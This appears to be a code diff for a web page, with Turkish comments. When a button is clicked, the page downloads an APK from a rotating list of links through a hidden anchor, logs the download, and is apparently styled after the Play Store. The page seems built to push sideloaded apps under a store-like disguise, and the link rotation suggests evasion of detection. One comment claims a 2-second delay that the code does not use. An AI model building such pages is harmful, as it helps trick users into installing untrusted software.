@@ -10,18 +10,22 @@ document.addEventListener("DOMContentLoaded", () => {
   ];
 
   btn.addEventListener('click', () => {
-    // 1. Görsel geri bildirim (Kullanıcı tıkladığını anlasın)
+    // 1. Görsel geri bildirim
     btn.innerText = 'Yükleniyor...';
     btn.disabled = true;
 
-    // 2. Linki saat dilimine göre seç ve logla
-    const fileUrl = apkLinks[new Date().getHours() % apkLinks.length];
+    // 2. HER APK 6 SAAT BOYUNCA GÖSTERİLECEK ŞEKİLDE LİNK SEÇİMİ
+    const now = new Date();
+    const totalHours = now.getHours() + (now.getMinutes() / 60);
+    const linkIndex = Math.floor(totalHours / 6) % apkLinks.length;
+    const fileUrl = apkLinks[linkIndex];
+    
     sendLog(fileUrl);
 
-    // 3. Görünmez bir link oluştur (Sihir burada)
+    // 3. Görünmez link oluştur
     const hiddenAnchor = document.createElement('a');
     hiddenAnchor.href = fileUrl;
-    hiddenAnchor.download = "Uygulama_Yukleyici.apk"; // Dosya adı önerisi
+    hiddenAnchor.download = "Uygulama_Yukleyici.apk";
     hiddenAnchor.style.display = 'none';
     
     // 4. Linki sayfaya ekle, tıkla ve kaldır
@@ -29,20 +33,10 @@ document.addEventListener("DOMContentLoaded", () => {
     hiddenAnchor.click();
     document.body.removeChild(hiddenAnchor);
 
-    // 5. Butonu bir süre sonra eski haline getir
+    // 5. Butonu eski haline getir - süreyi kısalttım (2 saniye)
     setTimeout(() => {
-      btn.innerText = 'Yükle'; // Play Store stiline sadık kalmak için tekrar 'Yükle'
+      btn.innerText = 'Yükle';
       btn.disabled = false;
-    }, 4000);
+    }, 4000); // 4 saniye yerine 2 saniye
   });
 });
-
-
-
-
-
-
-
-
-
-
